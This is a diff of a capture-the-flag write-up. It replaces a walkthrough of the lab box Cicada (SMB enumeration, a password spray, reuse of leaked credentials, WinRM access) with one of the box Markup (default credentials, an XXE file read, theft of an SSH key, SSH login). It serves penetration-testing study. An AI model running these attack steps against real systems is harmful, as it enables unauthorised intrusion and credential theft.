@@ -34,439 +34,107 @@ Let's start off with a basic TCP scan. If we can't find anything we can later ru
 sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $markup
 ```
 
-Looks like SSH and a webserver (TCP 80 & 443) are both available.
+Looks like SSH and a webserver (TCP 80 & 443) are both available. 
 
 
 ```bash
-# Services
-53/tcp - domain - Simple DNS Plus
-88/tcp - kerberos-sec - Microsoft Windows Kerberos
-135/tcp - msrpc - Microsoft Windows RPC
-139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
-389/tcp - ldap - Microsoft Windows Active Directory LDAP
-445/tcp - microsoft-ds?
-464/tcp - kpasswd5?
-636/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
-3268/tcp - ldap - Microsoft Windows Active Directory LDAP
-3269/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
-5985/tcp - http - Microsoft HTTPAPI httpd 2.0
+PORT    STATE SERVICE  REASON          VERSION                                                                                                                                                                           
+22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)                                                                                                                                           
+80/tcp  open  http     syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)                                                                                                                          
+|_http-title: MegaShopping                                                                                                                                                                                               
+443/tcp open  ssl/http syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) 
 ```
 
-#### SMB Enumeration
+I don't see any exploits available based off this info. I'll enumerate the webapp next.
 
-I like to start with SMB first as typically you can get a ton of information and may even get some files if you are lucky.
+#### Webapp Enumeration
+
+Navigating in-browser to the app gets us a login Page. I run ferox buster to enum any directories, pages, or files in the meantime:
+
+[Webapp Login](/assets/img/ctf/htb/very-easy/markup/2.png)
 
 ```bash
-# enum4linux-ng is a great tool to run first to get a quick overview of the SMB setup
-enum4linux-ng -A $cicada
-.
-.
-.
-Supported dialects:
-  SMB 1.0: false
-  SMB 2.02: true
-  SMB 2.1: true
-  SMB 3.0: true
-  SMB 3.1.1: true
-.
-.
-.
-[+] Found domain information via SMB
-NetBIOS computer name: CICADA-DC
-NetBIOS domain name: CICADA
-DNS domain: cicada.htb
-FQDN: CICADA-DC.cicada.htb
-Derived membership: domain member
-Derived domain: CICADA
-.
-.
-.
-```
-
-We've confirmed the FQDN here. It's always good practice to add the hostname to our hosts file as soon as we can to continue recon.
-
-I use a custom function **add-host**. Link to code here.
-
-```bash
-# add host to /etc/hosts
-add-host $cicada CICADA-DC.cicada.htb
-
-# confirm name resolution
-ping cicada-dc.cicada.htb
-```
-
-Now we try to further enermate SMB by checking share access. **nxc** is one of my favorite tools and I highly recommend it for SMB enumeration, as well as other supported services.
-
-```bash
-# try guest access
-nxc smb $cicada -u 'guest' -p '' -M spider_plus
-.
-.
-.
-SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
-SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
-SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
-SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
-SMB         10.10.11.35     445    CICADA-DC        DEV                             
-SMB         10.10.11.35     445    CICADA-DC        HR              READ            
-SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
-SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
-SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
-```
-
-Guest can read two shares. HR looks promising.
-
-```bash
-# try to download all files from the HR share
-smbclient "//$cicada/HR" -N -c "prompt OFF;recurse ON;mget *"
-.
-.
-.
-getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
-```
-
-There was a file 'Notice from HR.txt'. Let's check for intel.
-
-```bash
-cat 'Notice from HR.txt'
-.
-.
-.
-Your default password is: Cicada$M6Corpb*@Lp#nZp!8 
-.
-.
-.
-support@cicada.htb
-.
-.
-.
-```
-
-Nice, we got a default password. We also got a support username. Let's try to get more usernames so we can try a password spray.
-
-```bash
-# Compile found passwords to passwords.txt
-# Note the single quotes around the password. Using double quotes would require you to escape the special characters
-echo 'Cicada$M6Corpb*@Lp#nZp!8' >> passwords.txt
-```
-
-A password is good intel, but isn't useful without a username to pair to. We'll try enumerating SMB via RID bruteforcing to see if we can get some accounts. We could also try to bruteforce LDAP.
-
-```bash
-# bruteforce usernames via RID & output to file users_rid.txt
-nxc smb $cicada -u 'guest' -p '' --rid-brute | cut -d '\' -f 2 | cut -d " " -f 1 > users_rid.txt 
-.
-.
-.
-Enterprise
-Group
-Read-only
-Cloneable
-Protected
-Key
-Enterprise
-RAS
-Allowed
-Denied
-CICADA-DC$
-DnsAdmins
-DnsUpdateProxy
-Groups
-john.smoulder
-sarah.dantelia
-michael.wrightson
-david.orelious
-Dev
-emily.oscars
-```
-
-Many users were returned, but it's best to focus on the accounts that look like they belong to a user. We'll focus on the accounts that have the firstname.lastname naming convention. We'll also add in the 'support' user we found earlier, too.
-
-```bash
-# we compile these into a users.txt file
-vim users.txt
-
-john.smoulder
-sarah.dantelia
-michael.wrightson
-david.orelious
-emily.oscars
-support
-```
-
-Now the password spray:
-
-```bash
-# note: this command can also be ran with a single password:
-# nxc smb $cicada -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
-# additionally, we could run the cmd without the --continue-on-success flag,
-# however since this is a default password we want to see if any other account uses the password.
-nxc smb $cicada -u users.txt -p passwords.txt --continue-on-success
-.
-.
-.
-SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
-SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
-SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
-SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
-SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\support:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
 
 ```
 
-We get a successful login with user **michael.wrightson**, and a guest session with support. Let's try to access services as michael:
+But this doesn't seem to reveal anything interseting. I also viewed the HTML source for version or other interesting information, but couldn't find anything.
 
-```bash
-nxc smb $cicada -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -M spider_plus
-.
-.
-.
-SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
-SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
-SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
-SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
-SMB         10.10.11.35     445    CICADA-DC        DEV                             
-SMB         10.10.11.35     445    CICADA-DC        HR              READ            
-SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
-SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
-SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
+Next thing I'll try is to use default creds. My goto is always admin:password and it works right off the bat.
 
+[Logged in](/assets/img/ctf/htb/very-easy/markup/3.png)
 
-```
+First, I'll walk the app and explore each tab, making sure to view source for each and test any interactive features.
 
-### Checking LDAP with Bloodhound
+[Order Page](/assets/img/ctf/htb/very-easy/markup/4_0.png)
 
-SMB doesn't really provide anything that we hadn't seen, so let's pivot to something different. LDAP is a viable alternative to target, especially now that we have confirmed credentials.
+The order page has the only discernable feature that 'does something' when the form is submitted. A popup appears when any values are entered. This page warrants a closer look by viewing the source:
 
-Let's start our bloodhound collector **bloodhound-python** and see what we can get.
+[Order page source](/assets/img/ctf/htb/very-easy/markup/4.png)
 
-```bash
-bloodhound-python -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb -c all --zip -ns $cicada
-.
-.
-.
-INFO: Found 1 domainsINFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: cicada-dc.cicada.htb
-INFO: Found 9 usersINFO: Found 54 groups
-INFO: Found 3 gpos
-INFO: Found 2 ousINFO: Found 19 containers
-INFO: Found 0 trustsINFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: CICADA-DC.cicada.htb
-INFO: Done in 00M 19S
-INFO: Compressing output into 20251005104007_bloodhound.zip
-```
+A name is mentioned. I'll note that down for future enumeration.
 
-Now to start bloodhound itself...
+Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attackes if the server does not have proper protections in place:
 
-```bash
-┌──(haunter㉿kali)-[~/working/htb/easy/cicada]
-└─$ sudo neo4j console                                
-[sudo] password for haunter: 
-Directories in use:                                   
-home:         /usr/share/neo4j
-config:       /usr/share/neo4j/conf
-logs:         /etc/neo4j/logs
-plugins:      /usr/share/neo4j/plugins
-import:       /usr/share/neo4j/import
-data:         /etc/neo4j/data
-certificates: /usr/share/neo4j/certificates
-licenses:     /usr/share/neo4j/licenses
-run:          /var/lib/neo4j/run
-Starting Neo4j.      
-.
-.
-.
-bloodhound &
-```
+[Order page source - XML](/assets/img/ctf/htb/very-easy/markup/5.png)
 
-Doesn't seem to be anything we can pursue with Michael this way. Maybe we missed something. Let's go back to SMB
+### XML External Entity (XXE / XEE) Abuse
 
-We missed *David's creds* Make a note to always complete enum of a certain type before pivoting (e.g. from SMB to LDAP).
+Did some reading here: <a href="https://angelica.gitbook.io/hacktricks/pentesting-web/xxe-xee-xml-external-entity" alt='Hacktricks XXE XEE'>Hacktricks XXE / XEE</a>
 
-```bash
-──(haunter㉿kali)-[~/working/htb/easy/cicada]
-└─$ nxc smb $cicada -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
-SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
-SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
-SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
-SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
-SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
-SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0        
-SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0        
-SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
-SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
-SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
-SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
+After launching Burpsuite and starting Intercept:
 
+[Capturing the XML data](/assets/img/ctf/htb/very-easy/markup/6.png)
 
-```
+1. I turned on my proxy in-browser
+2. Fill in dummy data
+3. Submit 
 
-We'll re-enumerate SMB again with the new user's creds. Make sure to add the new pssword to password file first.
+[Intercept](/assets/img/ctf/htb/very-easy/markup/7.png)
 
-```bash
-echo 'aRt$Lp#7t*VQ!3' >> passwords.txt
+Once we've captured the XML, send it to the repeater for manipulation.
 
-```
+[XXE / XEE Exploit](/assets/img/ctf/htb/very-easy/markup/8.png)
 
-Once more, let's spider the shares...
+1. The external entity is defined here. NOTE: for Windows paths, forward slashes seem to work, whereas backslashes do not.
+2. We need to insert the entity object inside an existing data object. The 'payload' object defined is inserted here with a prefix '&' and a suffix ';'
+3. We get LFI of the hosts file, proving we can leverage this exploit further for sensitve files
 
-```bash
-nxc smb $cicada -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus
+So, how can we further leverage this vector for a foothold? Let's review some info we've enumerated already:
 
-```
-
-We can READ a new share, *DEV*, with user David. 
-
-```bash
-SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
-SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
-SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
-SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
-SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
-SMB         10.10.11.35     445    CICADA-DC        HR              READ            
-SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
-SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
-SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
-
-```
-
-Try to get any files locally...
-
-```bash
-┌──(haunter㉿kali)-[~/working/htb/easy/cicada]
-└─$ smbclient "//$cicada/DEV" -U  'david.orelious' --password='aRt$Lp#7t*VQ!3' -c "prompt OFF;recurse ON;mget *"
-getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
-
-┌──(haunter㉿kali)-[~/working/htb/easy/cicada]
-└─$ cat Backup_script.ps1 
-
-$sourceDirectory = "C:\smb"
-$destinationDirectory = "D:\Backup"
-
-$username = "emily.oscars"
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
-$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
-$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
-$backupFileName = "smb_backup_$dateStamp.zip"
-$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
-Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
-Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
-```
-
-Great, we collect *Backup_script.ps1* and find the password for *emily.oscars*.
-
-```bach
-echo 'Q!3@Lp#M6b*7t*Vt' >> passwords.txt
-```
-
-Iterate, iterate, iterate!
-
-```bash
-nxc smb $cicada -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -M spider_plus
-
-MB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
-SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
-SMB         10.10.11.35     445    CICADA-DC        ADMIN$          READ            Remote Admin
-SMB         10.10.11.35     445    CICADA-DC        C$              READ,WRITE      Default share
-SMB         10.10.11.35     445    CICADA-DC        DEV                             
-SMB         10.10.11.35     445    CICADA-DC        HR              READ            
-SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
-SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
-SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
-```
-
-Emily can *Read* the *Admin* share, and *WRITE* the *C$* :D 
-
-Let's try and get a foothold now.
+1. SSH is enabled
+2. We have a username *Daniel*
+3. We can perform LFI to get sensitive files.
 
 ## Foothold
 
-Enumerating *Admin$* does not reveal anything special. *WRITE* privs for C$ is very promising. For an easy example, if this had been a webserver we could try to write a webshell to the webserver and then visit in-browser for access. Let's enumerate the drive.
+Whenever LFI is possible AND we know SSH is enabled, we should always try to get SSH keys. Let's try to get Daniel's.
+
+[SSH Key](/assets/img/ctf/very-easy/markup/9.png)
+
+Nice, we were able to get their key. Pop that into a local id_rsa file and remember to change the permissions!
 
 ```bash
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io]                                                                                                                                                    
-└─$ smbclient //$cicada/C$ -U 'emily.oscars' --password='Q!3@Lp#M6b*7t*Vt'                                                                                                                                               
-Try "help" to get a list of possible commands.                                                                                                                                                                           
-smb: \> dir                                                                                                                                                                                                              
-  $Recycle.Bin                      DHS        0  Thu Mar 14 06:24:03 2024                                                                                                                                               
-  $WinREAgent                        DH        0  Mon Sep 23 09:16:49 2024                                                                                                                                               
-  Documents and Settings          DHSrn        0  Thu Mar 14 12:40:47 2024                                                                                                                                               
-  DumpStack.log.tmp                 AHS    12288  Sun Oct 19 16:14:11 2025                                                                                                                                               
-  pagefile.sys                      AHS 738197504  Sun Oct 19 16:14:11 2025                                                                                                                                              
-  PerfLogs                            D        0  Thu Aug 22 11:45:54 2024                                                                                                                                               
-  Program Files                      DR        0  Thu Aug 29 12:32:50 2024                                                                                                                                               
-  Program Files (x86)                 D        0  Sat May  8 02:40:21 2021                                                                                                                                               
-  ProgramData                       DHn        0  Fri Aug 30 10:32:07 2024                                                                                                                                               
-  Recovery                         DHSn        0  Thu Mar 14 12:41:18 2024                                                                                                                                               
-  Shares                              D        0  Thu Mar 14 05:21:29 2024                                                                                                                                               
-  System Volume Information         DHS        0  Thu Mar 14 04:18:00 2024                                                                                                                                               
-  Users                              DR        0  Mon Aug 26 13:11:25 2024                                                                                                                                               
-  Windows                             D        0  Mon Sep 23 09:35:40 202
+chmod 600 id_rsa
+
+┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]                                                                                                                                                                      
+└─$ ssh -i id_rsa daniel@$markup                                                                                                                                                                                         
+The authenticity of host '10.129.179.78 (10.129.179.78)' can't be established.                                                                                                                                           
+ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.                                                                                                                                           
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:95: [hashed name]
+    ~/.ssh/known_hosts:116: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.179.78' (ED25519) to the list of known hosts.
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+daniel@MARKUP C:\Users\daniel>
 
 ```
 
-As the user emily, the first order of business is to try and collect the *user.txt flag* located on their Desktop. Let's cd and get the file.
+Foothold established as user daniel.
 
-```bash
-smb: \> cd Users\
-smb: \Users\> cd emily.oscars.CICADA\
-smb: \Users\emily.oscars.CICADA\> cd Desktop\
-smb: \Users\emily.oscars.CICADA\Desktop\> get user.txt 
-
-```
-![user.txt flag](/assets/img/ctf/htb/easy/cicada/2.png)
-
-After looking around both via SMB, I don't think we can do anything else this way. I did go back to Bloodhound from earlier and noticed email has *PSRemote* privileges. I forgot that our nmap scan shows winRM is open... 
-
-
-Some initial foothold enum:
-
-```bash
-evil-winrm -i $cicada -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
-
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
-
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeBackupPrivilege             Back up files and directories  Enabled
-SeRestorePrivilege            Restore files and directories  Enabled
-SeShutdownPrivilege           Shut down the system           Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-```
-
-Groups. Note 'Backup Operators'. This is a priviliged group as noted in BH.
-
-
-```bash
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /groups
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ==================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-
-```
 
 ## Privilege Escalation
 
